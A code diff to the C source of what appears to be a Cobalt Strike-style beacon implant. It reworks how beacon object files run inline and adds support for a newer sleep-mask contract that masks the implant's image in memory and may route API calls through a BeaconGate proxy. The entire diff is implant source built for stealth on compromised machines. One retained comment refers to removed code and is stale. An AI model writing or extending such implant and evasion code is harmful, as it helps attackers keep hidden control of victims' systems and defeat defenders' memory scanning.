@@ -216,7 +216,7 @@ typedef struct {
 	BOOL   (*toWideChar)(char * src, wchar_t * dst, int max);
 
 	/* 4.9 BOF APIs — order matches resources/bapi.txt */
-	void   (*BeaconInformation)(BEACON_INFO * info);
+	BOOL   (*BeaconInformation)(BEACON_INFO * info);
 	BOOL   (*BeaconAddValue)(const char * key, void * ptr);
 	void * (*BeaconGetValue)(const char * key);
 	BOOL   (*BeaconRemoveValue)(const char * key);
@@ -1092,34 +1092,32 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 		if (perms_ok)
 			if (conv == 1) {
+				/* the 4.9 kit contract: sleep_mask(GARGLEP *, pSleep, time),
+				 * fed from what the 4.9 BEACON_INFO used to describe (that
+				 * struct carries the kit's 4.10 layout now) */
 				DWORD t = 0;
-				BEACON_INFO info;
-				static DWORD empty_sections[2] = { 0, 0 };
+				HEAP_RECORD * kit_heap;
+				DWORD * kit_sections;
 				if (args != NULL && alen >= (int)sizeof(DWORD))
 					memcpy(&t, args, sizeof(DWORD));
 				gargle_setup_parms(code_dst, code_dst + code.length, 0);
 				beacon_sleep_mask_set_exec(code_dst, (DWORD)code.length, (DWORD)total);
-				BeaconInformation(&info);
-				if (info.sections == NULL)
-					info.sections = empty_sections;
-				info.heap_records = track_memory_get_heap_records_to_mask();
-				if (info.heap_records != NULL && info.sections != NULL) {
+				kit_sections = gparms != NULL ? gparms->sections : NULL;
+				kit_heap = track_memory_get_heap_records_to_mask();
+				if (kit_heap != NULL && kit_sections != NULL) {
 					int r, w;
 					for (r = 0, w = 0; ; r++) {
-						if (info.heap_records[r].ptr == (char *)info.sections)
+						if (kit_heap[r].ptr == (char *)kit_sections)
 							continue;
 						if (w != r)
-							info.heap_records[w] = info.heap_records[r];
-						if (info.heap_records[r].ptr == NULL)
+							kit_heap[w] = kit_heap[r];
+						if (kit_heap[r].ptr == NULL)
 							break;
 						w++;
 					}
 				}
 				if (gparms != NULL) {
-					gparms->beacon_ptr = info.beacon_ptr;
-					gparms->sections = info.sections;
-					gparms->heap_records = info.heap_records;
-					memcpy(gparms->mask, info.mask, MASK_SIZE);
+					gparms->heap_records = kit_heap;
 					/* the info.sections assignment above restored the
 					 * generator-published (layout-blind) table - re-derive
 					 * the own-PE table or the mask walk lands on our
@@ -1168,6 +1166,22 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				else
 					Sleep(t);
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
+			}
+			else if (conv == 2) {
+#if defined(_M_X64)
+				/* the 4.10+ kit contract (arsenal-kit beacon.h): the object's
+				 * sleep_mask(BEACON_INFO *, FUNCTION_CALL *) decides how the
+				 * call runs - the sleep itself or a BeaconGate-proxied one
+				 * (gargle.cpp sm410_exec). The info sits in the clear on our
+				 * stack: the object masks the image, never this frame. */
+				BEACON_INFO info;
+				memset(&info, 0, sizeof(info));
+				beacon_info_fill(&info, code_dst, (DWORD)code.length, (DWORD)total);
+				spawn_log("sm410: call api=", (long)((FUNCTION_CALL *)args)->function);
+				((void (*)(BEACON_INFO *, FUNCTION_CALL *))inlinefunc)(&info, (FUNCTION_CALL *)args);
+#else
+				Sleep(args != NULL && alen >= (int)sizeof(DWORD) ? *(DWORD *)args : 0);
+#endif
 			}
 			else {
 #if defined(_M_X64) && defined(BOFWIN_ENABLE)
